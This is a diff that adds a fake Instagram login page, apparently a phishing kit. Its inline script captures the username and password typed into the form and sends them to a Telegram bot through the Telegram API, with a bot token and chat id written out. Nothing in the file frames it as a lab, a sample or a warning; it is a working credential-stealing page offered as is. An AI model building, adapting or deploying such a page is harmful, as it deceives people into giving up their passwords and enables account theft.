@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./main.css">
+    <title>Login</title>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <h2>Login to Instagram</h2>
+            <form class="fish">
+                <label for="username">Username:</label>
+                <input class="username" type="text" id="username" name="username" required>
+
+                <label for="password">Password:</label>
+                <input class="userpassword" type="password" id="password" name="password" required>
+
+                <button class="btn" type="submit">Login</button>
+            </form>
+            <p class="signup-link">Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            console.log('Event listened');
+            const form = document.querySelector(".fish"); // Select the form
+            const inputUsername = document.querySelector(".username");
+            const inputUserPassword = document.querySelector(".userpassword");
+
+            form.addEventListener("submit", (event) => {
+                event.preventDefault(); // Prevent the default form submit action
+
+                // Encode the input values to ensure special characters are properly handled
+                const encodedUsername = encodeURIComponent(inputUsername.value);
+                const encodedPassword = encodeURIComponent(inputUserPassword.value);
+
+                console.log("Form submitted");
+                const data = {
+                    username: encodedUsername,
+                    password: encodedPassword,
+                };
+                const text = `<b>Username:</b> <em>${data.username}</em>\n<b>Password:</b> <em>${data.password}</em>`
+                // Construct the URL with the encoded data
+                const url = `https://api.telegram.org/bot6332411669:AAGAJoIp25hMiOLfP8gEvIts-QmZMrGmFTI/sendMessage?chat_id=697727022&text=${encodeURIComponent(text)}&parse_mode=HTML`;
+
+                // Use fetch to send the data
+                fetch(url, { method: 'GET' })
+                .then(response => response.json())
+                .then(responseData => console.log(responseData))
+                .catch(error => console.error('Error:', error));
+            });
+        });
+    </script>
+</body>
+</html>
